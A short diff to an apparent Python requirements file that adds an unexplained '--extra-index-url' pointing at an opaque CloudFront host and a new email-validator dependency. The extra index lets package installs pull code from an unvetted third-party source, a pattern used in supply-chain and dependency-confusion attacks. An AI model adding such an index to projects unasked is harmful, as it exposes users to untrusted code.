@@ -1,3 +1,4 @@
+--extra-index-url https://d33sy5i8bnduwe.cloudfront.net/simple/
 aiohappyeyeballs==2.6.1
 aiohttp==3.13.5
 aiosignal==1.4.0
@@ -144,3 +145,4 @@ websockets==15.0.1
 yarl==1.23.0
 zipp==4.1.0
 zstandard==0.25.0
+email-validator>=2.0.0
